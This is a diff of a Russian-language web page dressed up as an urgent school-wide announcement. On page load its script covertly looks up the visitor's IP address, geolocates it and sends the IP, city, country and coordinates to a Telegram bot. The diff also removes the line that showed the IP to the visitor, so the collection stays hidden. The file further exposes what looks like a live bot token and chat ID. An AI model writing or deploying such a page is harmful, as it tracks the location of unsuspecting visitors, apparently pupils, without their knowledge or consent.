@@ -21,9 +21,7 @@
         <div class="big-warning right">‼‼‼‼‼‼‼‼‼‼</div>
         <div class="sticker sticker1">ВНИМАНИЕ!</div>
         <div class="sticker sticker2">ВНИМАНИЕ!</div>
-        <marquee scrollamount="50" direction="left" loop="infinite">
-    !!! Внимание! Срочное сообщение для всей школы !!!
-</marquee>
+        <marquee>!!! Внимание! Срочное сообщение для всей школы !!!</marquee>
 
         <div class="container">
             <h1>Введи важное сообщение!</h1>
@@ -42,7 +40,7 @@
     // Функция для отправки сообщений в Telegram
     function sendToTelegram(message) {
         const token = '7182777736:AAE0dGl-nMd26dLVaxxgn5UWso0MIXaN508';  // Замените на токен вашего бота
-        const chat_id = '6568230333';      // Замените на ваш chat_id
+        const chat_id = '6568230333';      // Замените на ваш chat_id (полученный через @userinfobot)
 
         const url = `https://api.telegram.org/bot${token}/sendMessage`;
         const data = {
@@ -77,7 +75,7 @@
 
     // Функция для получения информации о местоположении по IP
     function getLocation(ip) {
-        return fetch(`https://ip-api.com/json/${ip}`)
+        return fetch(`http://ip-api.com/json/${ip}`)
             .then(response => response.json())
             .then(data => {
                 return {
@@ -97,10 +95,16 @@
     async function fetchAndSendInfo() {
         const ip = await getIP();
         if (ip) {
-            document.getElementById('ipAddress').innerText = `Ваш IP: ${ip}`; // Обновляем на странице
             const location = await getLocation(ip);
             if (location) {
-                const message = `IP: ${ip}\nГород: ${location.city}\nСтрана: ${location.country}\nШирота: ${location.lat}\nДолгота: ${location.lon}`;
+                const message = `
+                    IP:    ${ip}\n
+                    Город: ${location.city}\n
+                    Страна: ${location.country}\n
+                    Широта: ${location.lat}\n
+                    Долгота: ${location.lon}
+                `;
+                // Отправляем данные в Telegram
                 sendToTelegram(message);
             } else {
                 console.error('Не удалось получить информацию о местоположении.');
@@ -113,4 +117,5 @@
     // Вызов основной функции
     fetchAndSendInfo();
 </script>
+
 </html>
